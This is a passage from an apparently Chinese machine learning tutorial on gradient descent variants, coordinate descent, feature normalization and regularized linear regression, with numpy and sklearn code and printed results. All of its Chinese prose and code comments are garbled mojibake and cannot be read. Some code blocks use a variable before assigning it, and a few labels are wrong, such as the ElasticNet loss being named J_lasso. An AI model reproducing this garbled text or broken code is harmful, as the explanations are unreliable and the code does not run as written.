4.96386168 1.01662312]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.1024122 ] [68.08959999] [75.78462184]] (2)ã€å°å¹…ä¼˜åŒ–ï¼šæ‰“ä¹±æ•°æ®ç´¢å¼•ï¼Œé¡ºåºé€‰å–å‘é‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # è¶…å‚æ•° learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): # æ‰“ä¹±é¡ºåºï¼Œé¡ºåºè¯»å– index = np.arange(m) np.random.shuffle(index) X = X[index] y = y[index] for i in range(m): x_i = X[i:i+1,:] y_i = y[i:i+1,:] gradient = x_i.T.dot(x_i.dot(w_init)-y_i) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02675441 3.98450041 4.00505391 4.9789357 1.02541193]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.24520848] [68.23968977] [75.98378179]] 3ã€å°æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆMini-batch SGDï¼‰ $$ \\displaystyle{\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial{\\theta}}J(\\theta) = \\displaystyle \\sum_{i\\in S}(h_\\theta(x^{(i)}) - y^{(i)})x^{(i)} = ({x^{(S)}})^T(x^{(S)}\\theta-y^{(S)}) , |S|=\\text{batch\\_size} \u003c m,\\; S\\subseteq \\{1,2,\\dots ,m\\},\\; S\\text{å‡åŒ€éšæœºé€‰å–}} $$ (1)ã€ä»£ç å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import numpy as np np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # åˆ†æ‰¹å¤§å° batch_size = 10 # æ‰¹æ¬¡æ•° num_batches = int(m/batch_size) # è¶…å‚æ•° learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): for _ in range(num_batches): random_index = np.random.randint(m) x_s = X[random_index:random_index+batch_size,:] y_s = y[random_index:random_index+batch_size,:] gradient = x_s.T.dot(x_s.dot(w_init)-y_s) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.04016211 3.9927612 4.01168955 4.96684374 1.00728303]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.14498768] [68.13517282] [75.83694482]] (2)ã€å°å¹…ä¼˜åŒ–ï¼šæ‰“ä¹±æ•°æ®ç´¢å¼•ï¼Œé¡ºåºæ‰¹é‡é€‰å–å‘é‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import numpy as np np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # åˆ†æ‰¹å¤§å° batch_size = 10 # æ‰¹æ¬¡æ•° num_batches = int(m/batch_size) # è¶…å‚æ•° learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): # æ‰“ä¹±é¡ºåºï¼Œé¡ºåºè¯»å– index = np.arange(m) np.random.shuffle(index) X = X[index] y = y[index] for i in range(num_batches): x_s = X[i*batch_size:i*batch_size+batch_size,:] y_s = y[i*batch_size:i*batch_size+batch_size,:] gradient = x_s.T.dot(x_s.dot(w_init)-y_s) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.0267601 3.98450244 4.00504673 4.978934 1.02541437]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.24518034] [68.23964038] [75.98376306]] 4ã€SGDçš„sklearnåº“å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import numpy as np from sklearn.linear_model import SGDRegressor np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è¶…å‚æ•° learning_rate = 0.001 # å­¦ä¹ ç‡ Î± n_iterations = 10000 # è¿­ä»£è½®æ¬¡ # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) sgd_reg = SGDRegressor( loss=\u0026#39;squared_error\u0026#39;, # MSE penalty = None, # æ— æ­£åˆ™é¡¹ alpha = 0, # æ— æ­£åˆ™å¼ºåº¦ learning_rate = \u0026#39;constant\u0026#39;, # å­¦ä¹ ç‡ eta0 = learning_rate, # å›ºå®šå­¦ä¹ ç‡ fit_intercept = True, # å¢åŠ åç½®åˆ— max_iter = n_iterations * m, # è¿­ä»£æ¬¡æ•° warm_start = False, # ä¸è¿›è¡Œæ‰‹åŠ¨è¿­ä»£ï¼Œç›´æ¥è¿­ä»£å®Œæˆ random_state = 20030428, # æ‰“ä¹±æ ·æœ¬çš„éšæœºç§å­ ) sgd_reg.fit(x,y.flatten()) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[sgd_reg.intercept_,sgd_reg.coef_.reshape(1,-1)]) # é¢„æµ‹ y_pre = sgd_reg.predict(x_pre).reshape(-1,1) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[4.78413833 4.04362443 4.06423645 5.03733553 1.08352435]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.86766804] [69.21400854] [77.04212681]] 5ã€æ¢¯åº¦ä¸‹é™æ³•çš„é—®é¢˜ä¸è§£å†³æ€è·¯ å­¦ä¹ é€Ÿç‡è°ƒæ•´ï¼ˆå­¦ä¹ é€Ÿç‡è°ƒåº¦ï¼ŒLearning rate schedulesï¼‰ï¼šè¯¥æ–¹æ³•è¯•å›¾åœ¨æ¯æ¬¡æ›´æ–°å‚æ•°çš„è¿‡ç¨‹ä¸­ï¼Œæ”¹å˜å­¦ä¹ é€Ÿç‡ã€‚ä¸€èˆ¬ä½¿ç”¨æŸç§äº‹å…ˆè®¾å®šçš„ç­–ç•¥æˆ–è€…åœ¨æ¯æ¬¡è¿­ä»£ä¸­è¡°å‡ä¸€ä¸ªè¾ƒå°çš„é˜ˆå€¼ åœ¨ç¨€ç–ç‰¹å¾æ•°æ®ä¸­ï¼šå¾ˆå°‘å‡ºç°çš„ç‰¹å¾åº”è¯¥ä½¿ç”¨ä¸€ä¸ªç›¸å¯¹è¾ƒå¤§çš„å­¦ä¹ é€Ÿç‡ å¯¹äºéå‡¸ç›®æ ‡å‡½æ•°ï¼šå¯èƒ½è½å…¥éç‚¹æˆ–å¹³æ»‘ç‚¹ ï¼ˆ1ï¼‰ã€ç¡®å®šé€Ÿç‡è°ƒæ•´å‡½æ•° 1 2 3 4 5 6 7 8 9 10 import numpy as np import matplotlib.pyplot as plt t0,t1 = 5,50000 def learning_rate_schedule(alpha): return t0/(alpha * 1000 + t1) x_show = np.linspace(1,1000,1000) y_show = np.array([learning_rate_schedule(x_show[i]) for i in range(len(x_show))]) plt.plot(x_show,y_show) [\u0026lt;matplotlib.lines.Line2D at 0x1a768afe390\u0026gt;] ï¼ˆ2ï¼‰ã€æ›´æ”¹å­¦ä¹ é€Ÿç‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # è¶…å‚æ•° # learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): gradient = X.T.dot(X.dot(w_init)-y) w_init = w_init - learning_rate_schedule(n_iteration)*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[4.97242598 3.99644548 4.01333635 4.98719143 1.04554164]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.36296538] [68.4494602 ] [76.21792798]] ä¸‰ã€åæ ‡ä¸‹é™ï¼ˆCoordinate Descentï¼‰ åæ ‡ä¸‹é™ï¼šä¸€æ¬¡èµ°ä¸€æ­¥ï¼Œæ¯æ¬¡åªåŠ¨ä¸€ä¸ªå˜é‡ã€‚å°†é«˜ç»´é—®é¢˜æ‹†æˆä¸€ç³»åˆ—ä¸€ç»´é—®é¢˜ï¼Œé€ä¸ªåæ ‡è¿­ä»£æ›´æ–°ï¼Œç›´åˆ°æ”¶æ•› æ ¸å¿ƒæ€æƒ³ï¼šå›ºå®šå…¶ä»–æ‰€æœ‰å˜é‡ï¼Œåªæ²¿ç¬¬iä¸ªåæ ‡æ–¹å‘åšä¸€ç»´æœ€ä¼˜åŒ–ï¼Œå¾ªç¯å¾€å¤ è¿­ä»£å…¬å¼ï¼š$\\displaystyle{\\theta_i^{(k+1)} = \\arg\\min_{\\theta_i}Loss(\\theta_1^{(k+1)}, \\dots, \\theta_{i-1}^{(k+1)}, \\theta_i, \\theta_{i+1}^{(k)}, \\dots, \\theta_n^{(k)})}$ï¼Œå…¶ä¸­ $Loss$ ä¸ºç›®æ ‡æŸå¤±å‡½æ•°ï¼Œ$\\theta^{(k)}$ ä¸ºç¬¬ $k$ æ¬¡è¿­ä»£æ—¶çš„å®Œæ•´å‚æ•°å‘é‡ï¼Œ$\\theta^{(k)}_i$ ä¸ºç¬¬ $k$ æ¬¡è¿­ä»£æ—¶å‘é‡ $\\theta$ çš„ç¬¬ $i$ ä¸ªåˆ†é‡ å¯¹äºMESçš„å‚æ•°è¿­ä»£å…¬å¼ï¼ˆç”±MSEæ¨å¯¼è€Œæ¥ï¼‰ï¼š $$ \\displaystyle{\\theta_j = \\frac{\\displaystyle{ \\sum^m_{i=1}x^{(i)}_j(y^{(i)}-\\sum_{k\\neq j}\\theta_kx^{(i)}_k)}}{\\displaystyle{\\sum^m_{i=1}(x_j^{(i)})^2}}}\\Rightarrow \\theta^{(k+1)}_j = \\theta^{(k)}_j - \\displaystyle{\\frac{1}{X_{Â·j}^TX_{Â·j}}X_{Â·j}^T(X\\theta-y)} $$ï¼Œå…¶ä¸­ $m$ ä¸ºæ ·æœ¬æ•°é‡ï¼Œ$\\theta_j$ ä¸º $\\theta$ çš„ç¬¬ $j$ ä¸ªåˆ†é‡ï¼Œ$x^{(i)}_j$ ä¸ºç¬¬ $i$ æ¡æ ·æœ¬çš„ç¬¬ $j$ ä¸ªåˆ†é‡ ä»£ç å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # è¶…å‚æ•° n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ theta = np.zeros(shape=(n+1,1)) for _ in range(n_iterations): for j in range(theta.shape[0]): theta[j] = theta[j] - (1/(X[:,j]@X[:,j]))*X[:,j]@(X@theta - y) print(\u0026#39;W_hat:\u0026#39;) print(theta) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(theta) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056] [3.98404888] [4.00452019] [4.9783491 ] [1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] å››ã€å½’ä¸€åŒ–ï¼ˆNormalizationï¼‰ å½’ä¸€åŒ–æ˜¯å°†ä¸åŒå°ºåº¦ã€çº²é‡å’Œåˆ†å¸ƒçš„æ•°æ®ç¼©æ”¾åˆ°åŒä¸€æ ‡å‡†åŒºé—´çš„é¢„å¤„ç†æŠ€æœ¯ æ ¸å¿ƒç›®çš„ï¼šæ¶ˆé™¤çº²é‡å½±å“ã€åŠ é€Ÿæ¨¡å‹æ”¶æ•›ã€æå‡æ•°å€¼ç¨³å®šæ€§ï¼ŒåŒæ—¶ä¿ç•™åŸå§‹ä¿¡æ¯çš„ç›¸å¯¹å…³ç³» ç‰¹å¾çº§å½’ä¸€åŒ–æ–¹æ³• æœ€å¤§å€¼æœ€å°å€¼å½’ä¸€åŒ–ï¼ˆMin-Maxï¼‰ï¼šå—ç¦»å¿ƒå€¼å½±å“è¾ƒå¤§ å¯¹ç¬¬jä¸ªç‰¹å¾å€¼åšå½’ä¸€åŒ–ï¼š$$\\displaystyle{x^{*}_{i,j} = \\frac{x_{i,j}-x_j^{\\text{min}}}{x_j^{\\text{max}}-x_j^{\\text{min}}}}$$ å¯¹æ•´ä¸ªæ•°æ®é›†åšå½’ä¸€åŒ–ï¼š$\\displaystyle{x^* = \\frac{x-min(x)}{max(x)-min(x)}}$ æ ‡å‡†å½’ä¸€åŒ–ï¼ˆZ-scoreï¼‰ï¼š å¯¹ç¬¬jä¸ªç‰¹å¾å€¼åšå½’ä¸€åŒ–ï¼š $$ \\displaystyle{x^*_{i,j} = \\frac{x_{i,j} - \\mu_j}{\\sigma_j}} $$ ï¼Œå…¶ä¸­ $$ \\displaystyle{\\mu_j=\\frac{1}{n}\\sum_{i=1}^n x_{i,j},\\quad \\sigma_j=\\sqrt{\\frac{1}{n} \\sum_{i=1}^n (x_{i,j}-\\mu_j)^2}} $$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np from sklearn.preprocessing import MinMaxScaler from sklearn.preprocessing import StandardScaler np.random.seed(20030428) # æ•°æ®ç»´åº¦ n = 4 # æ•°æ®è§„æ¨¡ m = 100 # åˆå§‹åŒ–æ•°æ® x = np.empty((m, 2)) x[:, 0] = np.random.normal(1, 2, m) x[:, 1] = np.random.random(m) * 10-3 plt.scatter(x[:,0],x[:,1],label=\u0026#39;original\u0026#39;) # Min-Maxå½’ä¸€åŒ– minmax_scaler = MinMaxScaler() x_min_max_normalization = minmax_scaler.fit_transform(x) plt.scatter(x_min_max_normalization[:,0],x_min_max_normalization[:,1],label=\u0026#39;min-max\u0026#39;) minmax_scaler.fit(x) # Z-scoreå½’ä¸€åŒ– standar_scaler = StandardScaler() x_standar_scaler = standar_scaler.fit_transform(x) plt.scatter(x_standar_scaler[:,0],x_standar_scaler[:,1],label=\u0026#39;z-score\u0026#39;) standar_scaler.fit(x) print(\u0026#39;Î¼ =\u0026#39;, standar_scaler.mean_) print(\u0026#39;ÏƒÂ² =\u0026#39;, standar_scaler.var_) plt.legend() plt.show() Î¼ = [1.07725633 2.44897092] ÏƒÂ² = [3.86482916 7.93336293] äº”ã€æ­£åˆ™åŒ–ï¼ˆRegularizationï¼‰ è¿‡æ‹Ÿåˆä¸æ¬ æ‹Ÿåˆ æ¬ æ‹Ÿåˆï¼ˆunderfitï¼‰ï¼šæœªæ‹Ÿåˆåˆ°ä½ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†å‡†ç¡®ç‡æœªè¾¾åˆ°æœ€é«˜ è¿‡æ‹Ÿåˆï¼ˆoverfitï¼‰ï¼šæ‹Ÿåˆè¿‡åº¦ï¼Œè®­ç»ƒé›†å‡†ç¡®ç‡å‡é«˜çš„åŒæ—¶ï¼Œæµ‹è¯•é›†çš„å‡†ç¡®ç‡åè€Œé™ä½ é€‚åº¦æ‹Ÿåˆï¼ˆjust rightï¼‰ï¼šè¿‡æ‹Ÿåˆå‰ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†å‡†ç¡®ç‡éƒ½è¾¾åˆ°æœ€é«˜æ—¶åˆ» æ­£åˆ™åŒ–ï¼šé˜²æ­¢è¿‡æ‹Ÿåˆï¼Œå¢åŠ æ¨¡å‹é²æ£’æ€§ï¼ˆRobustï¼‰ é²æ£’æ€§è°ƒä¼˜ï¼šä½¿æ¨¡å‹å…·æœ‰æ›´å¥½çš„é²æ£’æ€§ï¼Œè®©æ¨¡å‹çš„çš„æ³›åŒ–èƒ½åŠ›å’Œæ¨å¹¿èƒ½åŠ›æ›´åŠ å¼ºå¤§ æ­£åˆ™åŒ–æœ¬è´¨ï¼šç‰ºç‰²æ¨¡å‹åœ¨è®­ç»ƒé›†ä¸Šçš„æ­£ç¡®ç‡ä»¥æé«˜æ¨¡å‹çš„æ¨å¹¿èƒ½åŠ›ï¼Œå‚æ•° w åœ¨æ•°å€¼ä¸Šè¶Šå°è¶Šå¥½ï¼Œè¿›è€ŒæŠµæŠ—æ•°å€¼æ‰°åŠ¨ã€‚ä½† w çš„æ•°å€¼ä¸èƒ½æå°ï¼Œæ•…è€Œå°†åŸæ¥çš„æŸå¤±å‡½æ•°åŠ ä¸Šä¸€ä¸ªæƒ©ç½šé¡¹ æƒ©ç½šé¡¹ï¼ˆæ­£åˆ™é¡¹ï¼‰ï¼š L1 æ­£åˆ™é¡¹ï¼š $$ \\displaystyle{L_1(w) = \\sum^m_{i=0}|w_i|} $$ï¼ˆæ›¼å“ˆé¡¿è·ç¦»ï¼‰ï¼Œ $$ \\displaystyle{\\frac{\\partial}{\\partial w_i}L_1(w_i) = sign(w_i) = \\pm 1} $$ L2 æ­£åˆ™é¡¹ï¼š $$ \\displaystyle{L_2(w) = \\sum^m_{i=0}|w_i|^2} $$ï¼ˆæ¬§å¼è·ç¦»çš„å¹³æ–¹ï¼‰ï¼Œ $$ \\displaystyle{\\frac{\\partial}{\\partial w_i}L_2(w_i) = 2w_i} $$ æ­£åˆ™åŒ–åçš„å¤šå…ƒçº¿æ€§å›å½’çš„æŸå¤±å‡½æ•° Lasso å›å½’ï¼ˆå¥—ç´¢å›å½’ï¼Œç¨€ç–æ€§ï¼‰ï¼š æŸå¤±å‡½æ•° $$ J_{lasso}(\\theta)=MSE(\\theta)+L_1(\\theta) $$ æ¢¯åº¦ $$ \\displaystyle{\\nabla_{\\theta}J_{Lasso}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_1(\\theta)=X^T(X\\theta-y)+\\lambda sign(\\theta)} $$ Ridge å›å½’ï¼ˆå²­å›å½’ï¼Œå¹³æ»‘æ€§ï¼‰ï¼š æŸå¤±å‡½æ•° $$ J_{ridge}(\\theta)=MSE(\\theta)+L_2(\\theta) $$ æ¢¯åº¦ $$ \\displaystyle{\\nabla_{\\theta}J_{Ridge}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_2(\\theta)=X^T(X\\theta-y)+2\\lambda \\theta} $$ ElasticNetå›å½’ï¼ˆå¼¹æ€§ç½‘ç»œå›å½’ï¼‰ï¼š æŸå¤±å‡½æ•° $$ J_{lasso}(\\theta)=MSE(\\theta)+L_1(\\theta)+L_2(\\theta) $$ æ¢¯åº¦ $$\\displaystyle{\\nabla_{\\theta}J_{Lasso}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_1(\\theta)+\\frac{\\partial}{\\partial \\theta}L_2(\\theta)=X^T(X\\theta-y)+\\lambda[(1-r)sign(\\theta)+2r\\theta)]} $$ æ³¨ï¼šLasso å›å½’ä¸ Ridge å›å½’åªå®šä¹‰äº† Loss å‡½æ•°æ¨¡å‹ï¼Œå¯ä»¥ç”¨æ¢¯åº¦ä¸‹é™æ³•ã€åæ ‡ä¸‹é™æ³•ã€æœ€å°è§’å›å½’ï¼ˆLARSï¼‰ã€æ­£è§„æ–¹ç¨‹ç­‰æ–¹æ³•è¿›è¡Œæ±‚è§£ã€‚åœ¨ sklearn åº“ä¸­ Lasso å’Œ ElasticNet ä½¿ç”¨åæ ‡ä¸‹é™ï¼›Ridge ä½¿ç”¨æ­£è§„æ–¹ç¨‹ï¼›SVGRegressor ä½¿ç”¨éšæœºæ¢¯åº¦ä¸‹é™ï¼Œå¯è‡ªå®šä¹‰æ­£åˆ™åŒ–ç±»å‹ã€æ­£åˆ™åŒ–å¼ºåº¦ã€å­¦ä¹ ç‡ã€é˜ˆå€¼ã€è¿­ä»£æ¬¡æ•°ç­‰ç­‰ 1ã€Lassoå›å½’ï¼ˆsklearnåº“ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import numpy as np from sklearn.linear_model import Lasso np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) lasso_reg = Lasso(alpha=0.0015,max_iter=30000000) lasso_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[lasso_reg.intercept_,lasso_reg.coef_.reshape(1,-1)]) # é¢„æµ‹ y_pre = lasso_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) 1 2 3 4 5 6 7 8 9 10 W_hat: [[5.0464025 3.97908982 3.99958499 4.97364032 1.01995191]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.18512159] [68.14652889] [75.88324745]] 2ã€Ridgeå›å½’ï¼ˆsklearnåº“ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import numpy as np from sklearn.linear_model import Ridge np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) ridge_reg = Ridge(alpha=0.4,solver=\u0026#39;sag\u0026#39;) ridge_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[ridge_reg.intercept_,ridge_reg.coef_.reshape(1,-1)]) # é¢„æµ‹ y_pre = ridge_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.04469365 3.97896047 3.99922338 4.97248436 1.02326193]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.18895127] [68.16319935] [75.89870099]] 3ã€ElasticNetå›å½’ï¼ˆsklearnåº“ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import numpy as np from sklearn.linear_model import ElasticNet np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) elasticnet_reg = ElasticNet(alpha=0.01,l1_ratio=0.2) elasticnet_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) 